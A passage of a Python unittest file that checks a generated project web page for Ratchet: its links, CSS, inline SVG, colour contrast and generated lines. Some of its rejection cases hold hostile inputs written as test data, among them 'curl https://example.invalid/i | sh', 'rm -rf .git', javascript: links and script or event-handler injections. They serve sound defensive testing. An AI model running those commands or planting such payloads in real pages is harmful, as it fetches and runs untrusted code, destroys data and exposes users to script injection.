                self.assert_fails("and the page loads only a file in docs/ by its name")

    def test_a_stylesheet_or_a_font_from_elsewhere_fails(self):
        for rule, message in (("@import 'https://example.invalid/x.css';", "@import"),
                              ("@font-face { font-family: x; src: local(x); }", "@font-face"),
                              ("body { background: url(https://example.invalid/x.png); }", '"url"'),
                              ("body { background: URL(x.png); }", '"url"'),
                              ("body { background: u\\72l(x.png); }", "backslash"),
                              ("body { background: image-set('x.png' 1x); }", "image-set()"),
                              ("body { width: calc(1px + 1px); }", "calc()")):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails(message)
        self.setUp()
        self.change('<link rel="icon"', '<link rel="stylesheet"')
        self.assert_fails('the only <link> is rel="icon"')

    def test_a_link_out_of_the_repo_fails(self):
        for target in ("https://example.invalid/", "http://github.com/fabian-von-tiedemann/ratchet",
                       "https://github.com/fabian-von-tiedemann/ratchet-other", "https://github.com/fabian-von-tiedemann",
                       "javascript:alert(1)", "&#106;avascript:alert(1)", "mailto:x@example.invalid",
                       "https://fabian-von-tiedemann.github.io/ratchet/", "//example.invalid/"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="%s"' % REPO, 'href="%s"' % target)
                self.assert_fails("the link")

    def test_a_link_into_the_repo_that_leads_nowhere_fails(self):
        for target, message in (("/blob/main/NOT-A-FILE.md", "names a file that is not in this checkout"),
                                ("/tree/main/not-a-directory", "names a directory that is not in this checkout"),
                                ("/blob/main/checks", "names a file that is not in this checkout"),
                                ("/blob/main/../../other/x", "goes into the repo, but not"),
                                ("/blob/other/README.md", "goes into the repo, but not"),
                                ("/settings", "goes into the repo, but not"),
                                ("/releases/latest/../../x", "goes into the repo, but not")):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="%s/blob/main/LICENSE"' % REPO, 'href="%s%s"' % (REPO, target))
                self.assert_fails(message)

    def test_a_relative_link_or_a_fragment_that_leads_nowhere_fails(self):
        for target in ("missing.html", "../README.md", "/index.html", "#no-such-id", ".nojekyll"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="#start-here"', 'href="%s"' % target)
                self.assert_fails("the link")

    def test_a_relative_link_to_the_page_passes(self):
        self.change('href="#start-here"', 'href="index.html#start-here"')
        self.assertEqual(page_problems(self.copy), [])

    def test_a_fragment_that_is_not_an_id_on_its_page_fails(self):
        # The first is a typo for the id start-here, in a link to the page by its name.
        for target in ("index.html#start-hree", "index.html#Start-here", "index.html#", "#missing", "#start-hree", "#"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="#start-here"', 'href="%s"' % target)
                self.assert_fails("the link %r" % target, "is not an id on")

    def test_a_fragment_on_a_link_to_a_file_that_is_not_a_page_fails(self):
        self.change('href="#start-here"', 'href="ratchet-light.svg#logo"')
        self.assert_fails("the link 'ratchet-light.svg#logo'", "only a link to a page in docs/ may have a fragment")

    def test_an_id_twice_on_the_page_fails(self):
        # The second start-here is one a link names, so the link would lead to either.
        self.change('<h2 id="limits">', '<h2 id="start-here">')
        self.assert_fails("ids that stand more than once: start-here")

    def test_an_element_left_open_or_closed_out_of_order_fails(self):
        for old, new, message in (("</main>", "", "</body> does not close the element that is open, <main>"),
                                  ("<h1>Ratchet</h1>", "<h1><em>Ratchet</h1></em>", "</h1> does not close the element that is open, <em>"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1></p>", "</p> does not close"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><br></br>", "</br> closes a void element"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><p/>", "<p/> is not closed by its slash"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><!-- x -->", "which the page does not hold"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><![CDATA[x]]>", "which the page does not hold"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><?php ?>", "which the page does not hold"),
                                  ("<h1>Ratchet</h1>", '<h1 id="x" id="y">Ratchet</h1>', "has the attribute id twice"),
                                  ("<h1>Ratchet</h1>", "<h1 hidden>Ratchet</h1>", "may not have the attribute hidden"),
                                  ("<main>", "<main><title>x</title>", "a <title> stands in <head>, or directly in an <svg>")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails(message)

    def test_the_page_is_accessible_as_far_as_the_test_reads(self):
        for old, new, message in (('<html lang="en">', "<html>", 'must have lang="en"'),
                                  ('alt="Ratchet logo"', 'alt=""', "an <img> without alt text"),
                                  ('alt="Ratchet logo"', "", "an <img> without alt text"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><h3>x</h3>", "<h3> after <h1> skips a level"),
                                  ("<h1>Ratchet</h1>", "<h2>Ratchet</h2>", "holds <h1> 0 times")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails(message)

    def test_colors_with_too_little_contrast_fail(self):
        css = self.page()[self.page().index("<style>"):self.page().index("</style>")]
        light = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[0]))
        dark = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[1]))
        for scheme, palette, key, faint in (("light", light, "muted", "#aaaaaa"), ("dark", dark, "link", "#333366"),
                                            ("light", light, "bg", "#777777")):
            with self.subTest(scheme=scheme, key=key):
                self.setUp()
                self.change("--%s: %s;" % (key, palette[key]), "--%s: %s;" % (key, faint))
                self.assert_fails("in the %s palette" % scheme)
        self.setUp()
        self.change("</style>", "p { color: #777; }\n</style>")
        self.assert_fails("a hex color outside the two palettes")
        self.setUp()
        self.change(DARK, "@media (prefers-color-scheme: light)")
        self.assert_fails("the CSS has two :root blocks of colors")

    def test_the_ratios_are_as_wcag_computes_them(self):
        self.assertAlmostEqual(contrast("#000000", "#ffffff"), 21.0)
        self.assertAlmostEqual(contrast("#ffffff", "#ffffff"), 1.0)
        self.assertAlmostEqual(contrast("#767676", "#ffffff"), 4.54, places=2)

    def test_a_command_that_is_not_in_the_readme_fails(self):
        for old, new in (("python3 .ratchet/checks/init.py --check</code>", "python3 .ratchet/checks/init.py --force</code>"),
                         ("python3 .ratchet/checks/init.py</code>", "curl https://example.invalid/i | sh</code>"),
                         ("python3 .ratchet/checks/init.py</code>", "python3 .ratchet/checks/init.py\nrm -rf .git</code>")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails("is not a line of a code block marked sh in README.md")


class PageFetchLine(RepoCopy, unittest.TestCase):
    """generate.py writes the line on the page that fetches Ratchet, and --check fails when it is not current."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def write_page(self, text):
        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text)

    def test_the_page_fetches_what_the_readme_fetches(self):
        version, fetched = first_entry(self.copy)
        line = "<pre><code>%s</code></pre>" % (FETCH % fetched)
        self.assertEqual(lines_that_hold(self.page(), "git clone"), [line])
        with open(os.path.join(self.copy, "README.md"), encoding="utf-8") as handle:
            self.assertIn("   " + FETCH % fetched + "\n", handle.read())

    def test_a_release_that_moves_only_the_readme_fails_and_generate_moves_the_page(self):
        version, fetched = first_entry(self.copy)
        self.assertNotEqual(version, fetched)
        before = self.page()
        # The release gives the entry its date and moves the README, as AGENTS.md says. Then the page is stale.
        path = os.path.join(self.copy, "CHANGELOG.md")
        with open(path, encoding="utf-8", newline="") as handle:
            changelog = handle.read()
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(changelog.replace("## %s (unreleased)" % version, "## %s (2026-12-01)" % version, 1))
        path = os.path.join(self.copy, "README.md")
        with open(path, encoding="utf-8", newline="") as handle:
            readme = handle.read()
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(readme.replace("--branch v%s " % fetched, "--branch v%s " % version))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: generated text is out of date or was edited by hand", output)
        code, output = run("generate.py", root=self.copy, cwd=self.copy)
        self.assertEqual(code, 0, output)
        self.assertIn("wrote docs/index.html", output)
        self.assertEqual(self.page(), before.replace(FETCH % fetched, FETCH % version))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(page_problems(self.copy), [])

    def test_an_indented_fetch_line_passes_as_generate_reads_it(self):
        # generate.py reads the line after the spaces that indent it, so the test reads it the same way.
        version, fetched = first_entry(self.copy)
        line = "<pre><code>%s</code></pre>" % (FETCH % fetched)
        self.write_page(self.page().replace(line, "  " + line, 1))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(lines_that_hold(self.page(), "git clone"), [line])
        self.assertEqual(page_problems(self.copy), [])

    def test_the_page_moved_ahead_of_the_readme_fails(self):
        version, fetched = first_entry(self.copy)
        self.write_page(self.page().replace(FETCH % fetched, FETCH % version))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: generated text is out of date or was edited by hand", output)

    def test_a_fetch_line_of_another_form_fails(self):
        version, fetched = first_entry(self.copy)
        line = "<pre><code>%s</code></pre>" % (FETCH % fetched)
        for new in ("", line + "\n" + line, "<pre><code>%s && git -C .ratchet checkout main</code></pre>" % (FETCH % fetched),
                    "<p>%s</p>" % (FETCH % fetched), line + "\n<p>Or git clone the repo.</p>",
                    "<pre><code>%s</code></pre>" % (FETCH % "1.x")):
            with self.subTest(new=new):
                self.setUp()
                first_entry(self.copy)
                self.write_page(self.page().replace(line, new, 1))
                code, output = run("generate.py", "--check", root=self.copy)
                self.assertEqual(code, 1, output)
                self.assertIn("docs/index.html: the command that fetches Ratchet must be one line", output)
                self.assertNotIn("Traceback", output)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 1, output)
                self.assertNotIn("wrote docs/index.html", output)

    def test_no_page_fails(self):
        os.remove(os.path.join(self.copy, DOCS, PAGE))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: the file is missing", output)

    def test_a_page_that_is_not_utf8_fails_without_a_traceback(self):
        with open(os.path.join(self.copy, DOCS, PAGE), "ab") as handle:
            handle.write(b"\xff\n")
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("is not valid UTF-8", output)
        self.assertNotIn("Traceback", output)



# The line on the page that gives the count and the cap, as the test expects it. It is spelled out here and counted
# from ratchet.json below, not taken from generate.py, so the test does not compute it the way the generator does.
BUDGET_LINE = ('<p id="budget" class="stat"><strong>%d experimental rules, with a cap of %d.</strong> The core holds %d '
               'rules and is frozen: %d name a check and %d are text only. Counted by <code>checks/generate.py</code> '
               'from <code>ratchet.json</code>.</p>')


def budget_line(root):
    with open(os.path.join(root, "ratchet.json"), encoding="utf-8") as handle:
        data = json.load(handle)
    core = [rule for rule in data["rules"] if rule["status"] == "core"]
    experimental = [rule for rule in data["rules"] if rule["status"] == "experimental"]
    enforced = [rule for rule in core if rule["enforcement"] == "enforced"]
    return BUDGET_LINE % (len(experimental), data["experimental_cap"], len(core), len(enforced), len(core) - len(enforced))


class PageBudget(RepoCopy, unittest.TestCase):
    """generate.py writes the line on the page that gives the count of rules and the cap, and --check fails when it is stale."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def write_page(self, text):
        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text)

    def test_the_page_gives_the_count_and_the_cap_of_ratchet_json(self):
        self.assertEqual(lines_that_hold(self.page(), 'id="budget"'), [budget_line(self.copy)])
        self.assertIn("with a cap of 23.", budget_line(self.copy))

    def test_a_raised_cap_fails_until_generate_moves_the_page(self):
        before = self.page()
        old = budget_line(self.copy)
        self.edit("ratchet.json", '"experimental_cap": 23', '"experimental_cap": 24')
        new = budget_line(self.copy)
        self.assertNotEqual(old, new)
        self.assert_check_fails("docs/index.html: generated text is out of date or was edited by hand")
        code, output = run("generate.py", root=self.copy, cwd=self.copy)
        self.assertEqual(code, 0, output)
        self.assertIn("wrote docs/index.html", output)
        self.assertEqual(self.page(), before.replace(old, new))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(page_problems(self.copy), [])

    def test_a_number_edited_by_hand_fails(self):
        line = budget_line(self.copy)
        self.write_page(self.page().replace(line, line.replace("with a cap of 23.", "with a cap of 40."), 1))
        self.assert_check_fails("docs/index.html: generated text is out of date or was edited by hand")

    def test_an_indented_budget_line_passes(self):
        line = budget_line(self.copy)
        self.write_page(self.page().replace(line, "  " + line, 1))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)

    def test_a_budget_line_of_another_form_fails(self):
        line = budget_line(self.copy)
        for new in ("", line + "\n" + line, line + " And more.", line.replace("<strong>", "<strong>about ", 1),
                    line.replace('<p id="budget" class="stat">', '<p class="stat">\n<span id="budget"></span>', 1),
                    line + '\n<p id="budget-old">23 experimental rules</p>'.replace("budget-old", "budget"),
                    line.replace("with a cap of 23.", "with a cap of twenty-three.")):
            with self.subTest(new=new):
                self.setUp()
                self.write_page(self.page().replace(line, new, 1))
                code, output = run("generate.py", "--check", root=self.copy)
                self.assertEqual(code, 1, output)
                self.assertIn("docs/index.html: the count of rules must be one line", output)
                self.assertNotIn("Traceback", output)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 1, output)
                self.assertNotIn("wrote docs/index.html", output)


class PageSources(RepoCopy, unittest.TestCase):
    """The list of sources on the page is sources.json, with the rules in ratchet.json that cite each."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        Page.change(self, old, new)

    def assert_fails(self, *message):
        Page.assert_fails(self, *message)

    def test_each_source_stands_with_its_link_its_license_and_the_rules_that_cite_it(self):
        # Written out here from sources.json and the sources of the rules in ratchet.json, as they stand.
        text = self.page()
        expected = (
            ("https://github.com/google/elephant-goldfish-model", "google/elephant-goldfish-model", "Apache-2.0",
             ("ratchet.fresh-context",)),
            ("https://github.com/mattpocock/skills", "mattpocock/skills", "MIT",
             ("ratchet.glossary", "ratchet.look-up-facts", "ratchet.grill-first", "ratchet.findings-marked", "ratchet.root-cause",
              "ratchet.test-first", "ratchet.slices")),
            ("https://github.com/cursor/plugins/tree/HEAD/pstack", "pstack", "MIT",
             ("ratchet.two-rounds", "ratchet.findings-marked", "ratchet.root-cause", "ratchet.simplest",
              "ratchet.lesson-names-check", "ratchet.si-repeat-is-signal")),
            ("https://github.com/obra/superpowers", "obra/superpowers", "MIT",
             ("ratchet.verify-findings", "ratchet.evidence-before-done", "ratchet.cr-verify-reports")),
        )
        reader = PageReader()
        reader.feed(text)
        items = [item for item in reader.items if item["list"] == "sources"]
        self.assertEqual([(item["links"][0], item["licenses"], tuple(item["codes"])) for item in items],
                         [((link, name), [license], keys) for link, name, license, keys in expected])

    def test_a_source_left_out_or_out_of_order_fails(self):
        text = self.page()
        start, end = text.index('<ul class="sources">'), text.index("</ul>", text.index('<ul class="sources">'))
        items = text[start:end].split("<li>")[1:]
        for new in ("<li>".join([""] + items[1:]), "<li>".join([""] + [items[1], items[0]] + items[2:])):
            with self.subTest(new=new[:60]):
                self.setUp()
                self.change(text[start:end], '<ul class="sources">\n' + new.lstrip("\n"))
                self.assert_fails("the list of sources")

    def test_a_source_added_to_sources_json_fails_until_the_page_names_it(self):
        self.edit("sources.json", '  "sources": [\n', '  "sources": [\n    {\n      "name": "example/new",\n      "repo": '
                  '"https://github.com/example/new",\n      "commit": "%s",\n      "license": "MIT"\n    },\n' % ("a" * 40))
        self.assert_fails("the list of sources")

    def test_a_wrong_license_fails(self):
        self.change('<span class="license">Apache-2.0</span>', '<span class="license">MIT</span>')
        self.assert_fails("google/elephant-goldfish-model", "license")

    def test_a_rule_that_cites_a_source_and_is_not_on_the_page_fails(self):
        path = os.path.join(self.copy, "ratchet.json")
        with open(path, encoding="utf-8") as handle:
            text = handle.read()
        at = text.index('"key": "ratchet.reuse-first"')
        cut = text.index('"source": ""', at)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(text[:cut] + '"source": "obra/superpowers `example`"' + text[cut + len('"source": ""'):])
        self.assert_fails("obra/superpowers", "ratchet.reuse-first")

    def test_a_key_on_the_page_that_does_not_cite_the_source_fails(self):
        for old, new in (("<code>ratchet.fresh-context</code>", "<code>ratchet.fresh-context</code>, <code>ratchet.simplest</code>"),
                         ("<code>ratchet.fresh-context</code>", "")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails("google/elephant-goldfish-model", "cite it")

    def test_a_link_to_a_source_in_another_form_fails(self):
        for target in ("https://github.com/google/elephant-goldfish-model/tree/main", "https://github.com/google",
                       "https://github.com/google/elephant-goldfish-model/", "http://github.com/google/elephant-goldfish-model",
                       "https://github.com/cursor/plugins"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="https://github.com/google/elephant-goldfish-model"', 'href="%s"' % target)
                self.assert_fails("the link %r" % target)


class PageDiagrams(RepoCopy, unittest.TestCase):
    """The two diagrams are ordered lists whose every step links to where the repo shows it."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        Page.change(self, old, new)

    def assert_fails(self, *message):
        Page.assert_fails(self, *message)

    def test_there_are_two_diagrams_of_steps_that_each_link_into_the_repo(self):
        reader = PageReader()
        reader.feed(self.page())
        steps = [item for item in reader.items if item["list"] == "flow"]
        self.assertEqual(len([classes for tag, classes in reader.lists if tag == "ol" and "flow" in classes]), 2)
        self.assertGreaterEqual(len(steps), 10)
        self.assertTrue(all(any(into_repo(href) for href, _ in item["links"]) for item in steps))

    def test_a_diagram_is_counted_by_its_class_in_any_order(self):
        # The class attribute holds a list: "loop flow" is a diagram as much as "flow loop" is.
        self.change('<ol class="flow loop">', '<ol class="loop  flow">')
        reader = PageReader()
        reader.feed(self.page())
        self.assertEqual(len([classes for tag, classes in reader.lists if tag == "ol" and "flow" in classes]), 2)
        self.assertEqual(page_problems(self.copy), [])

    def test_a_step_without_a_link_fails(self):
        self.change('<a href="https://github.com/fabian-von-tiedemann/ratchet/blob/main/templates/LESSON.md">templates/LESSON.md</a>',
                    "templates/LESSON.md")
        self.assert_fails("a step of a diagram that links nowhere in this repo")

    def test_a_step_whose_only_link_leads_out_of_the_repo_fails(self):
        # A link to a source in sources.json is allowed on the page, but it does not show where this repo does the step.
        self.change('<a href="https://github.com/fabian-von-tiedemann/ratchet/blob/main/templates/LESSON.md">templates/LESSON.md</a>',
                    '<a href="https://github.com/mattpocock/skills">mattpocock/skills</a>')
        self.assert_fails("a step of a diagram that links nowhere in this repo")
        self.assertEqual(len([problem for problem in page_problems(self.copy) if "links nowhere" in problem]), 1)

    def test_the_sandbox_is_linked_to_its_issue(self):
        self.assertIn('href="%s/issues/49"' % REPO, self.page())

    def test_a_link_to_an_issue_of_another_form_fails(self):
        for target, message in (("/issues/0", "goes into the repo, but not"), ("/issues/49/../../x", "goes into the repo, but not"),
                                ("/issues", "goes into the repo, but not"), ("/issues/new", "goes into the repo, but not")):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="%s/issues/49"' % REPO, 'href="%s%s"' % (REPO, target))
                self.assert_fails(message)

    def test_the_new_colors_are_held_to_the_same_contrast(self):
        css = self.page()[self.page().index("<style>"):self.page().index("</style>")]
        light = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[0]))
        dark = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[1]))
        for scheme, palette, key, faint in (("light", light, "box", "#555555"), ("dark", dark, "box", "#9a9a9a"),
                                            ("light", light, "accent", "#ffbb66"), ("dark", dark, "accent", "#3a2a10")):
            with self.subTest(scheme=scheme, key=key):
                self.setUp()
                self.change("--%s: %s;" % (key, palette[key]), "--%s: %s;" % (key, faint))
                self.assert_fails("in the %s palette" % scheme, "--%s" % key)

    def test_the_dark_and_the_orange_bands_are_held_to_the_same_contrast(self):
        css = self.page()[self.page().index("<style>"):self.page().index("</style>")]
        light = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[0]))
        dark = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[1]))
        # Each key differs between the palettes, so the first match on the page is the one in the palette named.
        for scheme, palette, key, faint in (("light", light, "ink-muted", "#3d392e"), ("dark", dark, "ink-fg", "#303030"),
                                            ("light", light, "go-fg", "#c05010"), ("dark", dark, "ink-box", "#9a9a9a"),
                                            ("light", light, "code-fg", "#a09a8a")):
            with self.subTest(scheme=scheme, key=key):
                self.setUp()
                self.change("--%s: %s;" % (key, palette[key]), "--%s: %s;" % (key, faint))
                self.assert_fails("in the %s palette" % scheme, "--%s" % key)

    def test_the_prompt_on_the_code_of_the_orange_band_is_held_to_the_same_contrast(self):
        # The "$" before a command is --ink-accent, and in the orange band it stands on --go-code-bg. The new background
        # keeps --go-code-fg legible, so only that pair fails.
        for scheme, old in (("light", "\n  --go-code-bg: #15140f;"), ("dark", "\n    --go-code-bg: #15140f;")):
            with self.subTest(scheme=scheme):
                self.setUp()
                self.change(old, old.replace("#15140f", "#555555"))
                problems = [problem for problem in page_problems(self.copy) if "contrast ratio" in problem]
                self.assertEqual(len(problems), 1, problems)
                self.assert_fails("in the %s palette, --ink-accent on --go-code-bg" % scheme)


# The first figure, where a case below puts what it adds. Each insert stands at the first of its kind on the page.
FIGURE = '<svg class="fig fig-ratchet"'
FIGURE_INSIDE = '<g fill="currentColor" stroke="none">'


class PageFigures(RepoCopy, unittest.TestCase):
    """The figures are inline SVG drawn from a short list of elements and attributes, each named by its own title."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        Page.change(self, old, new)

    def assert_fails(self, *message):
        Page.assert_fails(self, *message)

    def test_there_are_five_figures_each_named_by_its_title(self):
        reader = PageReader()
        reader.feed(self.page())
        self.assertEqual(len(reader.figures), 5)
        # Each figure is named by the class fig and one class fig-<name>, so that no class of a part of a figure, such
        # as the ski in the loop, is also the class of a whole figure and styles every stroke in it.
        names = [[each for each in figure["classes"] if each.startswith("fig-")] for figure in reader.figures]
        self.assertEqual(names, [["fig-dial"], ["fig-ratchet"], ["fig-loop"], ["fig-ski"], ["fig-machine"]])
        self.assertTrue(all(figure["classes"][:1] == ["fig"] and len(figure["classes"]) == 2 for figure in reader.figures))
        for figure in reader.figures:
            self.assertEqual(figure["role"], "img")
            self.assertEqual(figure["titles"], [figure["labelledby"]])
        self.assertEqual(reader.head_titles, 1)

    def test_an_element_that_is_not_on_the_list_of_svg_fails(self):
        for element in ('<use href="#fig-loop-title"></use>', '<image href="https://example.invalid/x.png"></image>',
                        '<a href="https://example.invalid/"><text>x</text></a>', "<script>alert(1)</script>",
                        "<foreignObject><p>x</p></foreignObject>", "<style>path { fill: red; }</style>",
                        '<marker id="m"></marker>', '<linearGradient id="g"></linearGradient>', '<filter id="f"></filter>',
                        '<animate attributeName="x"></animate>', '<set attributeName="x"></set>', "<svg></svg>",
                        "<p>x</p>"):
            with self.subTest(element=element):
                self.setUp()
                self.change(FIGURE_INSIDE, element + FIGURE_INSIDE)
                self.assert_fails("is not an element this page may hold in an <svg>")

    def test_an_element_of_svg_outside_an_svg_fails(self):
        self.change("</main>", '<path d="M0 0 L1 1"></path>\n</main>')
        self.assert_fails("<path> is not an element this page may hold")

    def test_an_attribute_that_is_not_on_the_list_fails(self):
        for where, attribute, name in ((FIGURE, 'onload="alert(1)"', "onload"), (FIGURE, 'xmlns:xlink="x"', "xmlns:xlink"),
                                       ('<path class="axis"', 'href="#fig-loop-title"', "href"),
                                       ('<path class="axis"', 'xlink:href="#fig-loop-title"', "xlink:href"),
                                       ('<path class="axis"', 'style="fill: url(#g)"', "style"),
                                       ('<path class="axis"', 'onclick="x()"', "onclick"),
                                       ('<path class="axis"', 'filter="x"', "filter"),
                                       ('<path class="axis"', 'marker-end="x"', "marker-end"),
                                       ('<text class="mark-no"', 'onmouseover="x()"', "onmouseover")):
            with self.subTest(attribute=attribute):
                self.setUp()
                tag = where.split()[0][1:]
                self.change(where, "<%s %s%s" % (tag, attribute, where[len(tag) + 1:]))
                self.assert_fails("<%s> may not have the attribute %s" % (tag, name))

    def test_a_paint_that_is_not_none_or_the_current_color_fails(self):
        for paint in ("url(#g)", "#ff0000", "red", "url(https://example.invalid/x.svg#g)"):
            with self.subTest(paint=paint):
                self.setUp()
                self.change(FIGURE_INSIDE, '<g fill="%s" stroke="none">' % paint)
                self.assert_fails("<g> has fill=%r, and a fill or a stroke is none or currentColor" % paint)

    def test_a_value_of_another_form_fails(self):
        for old, new in (('transform="translate(204 226)"', 'transform="url(#x)"'),
                         ('transform="translate(204 226)"', 'transform="matrix(1 0 0 1 0 0)"'),
                         ('transform="translate(204 226)"', 'transform="translate(204 226); x: y"'),
                         ('<path class="axis" d="', '<path class="axis" d="javascript:x '),
                         ('font-family="monospace"', 'font-family="x&#58;y"')):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails("in an <svg> is numbers and words, and calls only translate() and rotate()")

    def test_a_title_that_stands_elsewhere_fails(self):
        for old, new in (("<main>", "<main><title>x</title>"), ("<h1>Ratchet</h1>", "<h1>Ratchet<title>x</title></h1>"),
                         ('<path class="axis"', '<g><title>x</title></g><path class="axis"')):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails("a <title> stands in <head>, or directly in an <svg>")

    def test_a_second_title_in_the_head_fails(self):
        self.change("</title>\n", "</title>\n<title>x</title>\n")
        self.assert_fails("holds <title> 2 times in <head>, and must hold it once")

    def test_a_figure_that_is_not_named_by_its_one_title_fails(self):
        for old, new in (('role="img" aria-labelledby="fig-ratchet-title"', 'aria-labelledby="fig-ratchet-title"'),
                         ('role="img" aria-labelledby="fig-ratchet-title"', 'role="presentation" aria-labelledby="fig-ratchet-title"'),
                         ('aria-labelledby="fig-ratchet-title"', 'aria-labelledby="fig-loop-title"'),
                         ('aria-labelledby="fig-ratchet-title" ', ""),
                         ('<title id="fig-ratchet-title">', "<title>"),
                         ('<title id="fig-ratchet-title">', '<title id="fig-ratchet-title">x</title>\n<title id="fig-ratchet-title-2">')):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails('an <svg> has role="img" and one <title> directly in it, whose id its aria-labelledby names')


# The dial of the principles: the <svg> of this class, and in it one label per notch, a <text> of the class "lab" and of
# the class n0 to n10 for its notch. A long label is wrapped over several <text> elements of the same notch. The dial
# holds no other <text>. Beside it, the same titles stand as a list for a narrow screen, <ol class="principle-list">.
DIAL = "fig-dial"
DIAL_LIST = "principle-list"
DIAL_NOTCH = re.compile(r"n(0|[1-9][0-9]*)\Z")
# Every void element of HTML. One has no end tag, so the reader counts none of them as opening or closing the list.
HTML_VOID = frozenset(("area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "source", "track", "wbr"))


class DialReader(html.parser.HTMLParser):
    """Reads the dial of the principles and its list: each label with its notch, each item of the list, and what is wrong."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.dials, self.depth, self.labels, self.text = 0, 0, [], None
        self.lists, self.items, self.in_list, self.problems = 0, [], 0, []

    def handle_starttag(self, tag, attrs):
        classes = (dict(attrs).get("class") or "").split()
        if self.depth:
            self.depth += 1
        elif tag == "svg" and DIAL in classes:
            self.dials, self.depth = self.dials + 1, 1
        if self.depth and tag == "text":
            if "lab" not in classes:
                self.problems.append("line %d: a <text> in the dial that is not a label of the class lab" % self.getpos()[0])
            notches = [int(match.group(1)) for match in map(DIAL_NOTCH.match, classes) if match]
            self.text = [notches[0] if len(notches) == 1 else None, []]
        if self.in_list:
            if tag in HTML_VOID:
                self.problems.append("line %d: the list of the principles holds a <%s>, a void element, and its items hold only"
                                     " text" % (self.getpos()[0], tag))
                return
            self.in_list += 1
            if tag == "li" and self.in_list == 2:
                self.text = [None, []]
            elif self.in_list == 2:
                self.problems.append("line %d: the list of the principles holds a <%s>, and holds only <li>" % (self.getpos()[0], tag))
        elif tag == "ol" and DIAL_LIST in classes:
            self.lists, self.in_list = self.lists + 1, 1

    def handle_endtag(self, tag):
        if self.depth:
            self.depth -= 1
        if self.in_list:
            if tag in HTML_VOID:
                self.problems.append("line %d: the list of the principles holds a </%s>, which a browser reads as a void element,"
                                     " and its items hold only text" % (self.getpos()[0], tag))
                return
            self.in_list -= 1
            if tag == "li" and self.in_list == 1 and self.text is not None:
                self.items.append(" ".join("".join(self.text[1]).split()))
                self.text = None
            return
        if tag == "text" and self.text is not None:
            self.labels.append((self.text[0], " ".join("".join(self.text[1]).split())))
            self.text = None

    def handle_startendtag(self, tag, attrs):
        # <br/> is one problem, not two: in the list, a void element is neither opened nor closed.
        self.handle_starttag(tag, attrs)
        if not (self.in_list and tag in HTML_VOID):
            self.handle_endtag(tag)

    def handle_data(self, data):
        if self.in_list == 1 and data.strip():
            self.problems.append("line %d: the list of the principles holds text outside an <li>, and holds only <li>"
                                 % self.getpos()[0])
        if self.text is not None:
            self.text[1].append(data)


def dial_problems(root):
    """Why the dial on the page, or its list, does not name the principles in ratchet.json, in order.

    The page holds one dial. Its labels stand by notch, n0 first, and notch k is labelled by one or more <text>
    elements in a row. Joined with a space, they read "01 " and the title of the first principle, "02 " and the title
    of the second, and so on, one notch for each principle. The dial holds no other <text>. The page also holds one
    <ol class="principle-list">, whose items are the titles, in the same order. So a principle that is added, removed,
